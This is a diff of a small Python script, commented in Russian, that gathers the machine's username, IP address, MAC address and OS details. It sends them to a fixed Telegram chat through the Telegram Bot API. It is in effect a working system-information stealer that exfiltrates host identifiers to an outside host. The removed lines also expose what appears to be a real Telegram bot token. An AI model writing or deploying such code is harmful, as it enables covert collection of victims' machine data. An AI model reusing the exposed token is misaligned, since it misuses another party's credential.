@@ -1,29 +1,37 @@
-import telebot
-import socket
+import requests
 
 import getpass
 import os
 import socket
-from datetime import datetime
+import platform
 from uuid import getnode as get_mac
-import pyautogui
+
+#from datetime import datetime
+#import pyautogui
 #from speedtest import Speedtest
 import telebot
-import psutil
-import platform
+from telebot import types
+#import psutil
 #from PIL import Image
 
-bot = telebot.TeleBot("7020392083:AAEa8m5fkYzRE1RzHYWPV30Q6V1TUCH4QfI")  # Подключение бота
+#bot = telebot.TeleBot("")  # Подключение бота
+
+token = ""
+chat_id = "404628537"
+message = "Собираем информацию..."
 
 name = getpass.getuser()    # Имя пользователя
 ip = socket.gethostbyname(socket.getfqdn())   # IP-адрес системы
-mac = get_mac()   # MAC адрес
+mac = str(hex(get_mac()))   # MAC адрес
 ost = platform.uname()    # Название операционной системы
 
-print(name)
-print(ip)
-print(mac)
-print(ost)
+message ='IP adress: ' + ip + '\n' + 'Имя машины: ' + name + '\n' + 'MAC адресс: ' + mac
+
+
+url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # Эта строка отсылает сообщение
+
+
 
 #from speedtest import Speedtest # Импорт модуля. Рассматривался выше
 #inet = Speedtest()
